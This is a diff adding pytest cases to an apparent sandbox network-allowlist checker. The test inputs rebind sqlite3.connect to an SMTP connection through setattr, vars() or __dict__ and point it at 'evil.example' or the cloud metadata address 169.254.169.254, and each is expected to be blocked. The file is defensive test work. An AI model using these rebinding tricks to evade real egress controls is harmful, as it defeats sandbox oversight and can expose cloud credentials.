@@ -4930,3 +4930,67 @@ class TestConditionalExpressionTargets:
             "import requests\n"
             'requests.get("https://huggingface.co/a" if flag else "https://huggingface.co/b")'
         )
+
+
+class TestDynamicallyReplacedConnectors:
+    """An attribute written at runtime cannot be proven unchanged, so the exemption is withheld
+    for everything under that name."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "import sqlite3, smtplib\n"
+                'setattr(sqlite3, "connect", smtplib.SMTP().connect)\n'
+                'sqlite3.connect("evil.example", 25)',
+                id = "setattr",
+            ),
+            pytest.param(
+                "import sqlite3, smtplib\n"
+                "setattr(sqlite3, name, smtplib.SMTP().connect)\n"
+                'sqlite3.connect("evil.example", 25)',
+                id = "setattr_with_a_computed_name",
+            ),
+            pytest.param(
+                "import sqlite3, smtplib\n"
+                'vars(sqlite3)["connect"] = smtplib.SMTP().connect\n'
+                'sqlite3.connect("evil.example", 25)',
+                id = "vars_mapping",
+            ),
+            pytest.param(
+                "import sqlite3, smtplib\n"
+                'sqlite3.__dict__["connect"] = smtplib.SMTP().connect\n'
+                'sqlite3.connect("evil.example", 25)',
+                id = "dunder_dict",
+            ),
+            pytest.param(
+                'import sqlite3\ndelattr(sqlite3, "connect")\nsqlite3.connect("evil.example", 25)',
+                id = "delattr",
+            ),
+        ],
+    )
+    def test_a_namespace_written_at_runtime_loses_the_exemption(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
+    def test_the_metadata_host_through_the_same_trick_is_blocked(self):
+        _blocked(
+            "import sqlite3, smtplib\n"
+            'setattr(sqlite3, "connect", smtplib.SMTP().connect)\n'
+            'sqlite3.connect("169.254.169.254", 80)',
+            expect_phrase = "Blocked: cloud-metadata host",
+        )
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param('import sqlite3\nsqlite3.connect("state.db")', id = "untouched"),
+            pytest.param('import sqlite3 as db\ndb.connect("state.db")', id = "aliased"),
+            pytest.param(
+                'import sqlite3\nclass C:\n    pass\nsetattr(C, "x", 1)\n'
+                'sqlite3.connect("state.db")',
+                id = "setattr_on_something_else",
+            ),
+        ],
+    )
+    def test_an_untouched_connector_keeps_its_exemption_ok(self, code):
+        _ok(code)
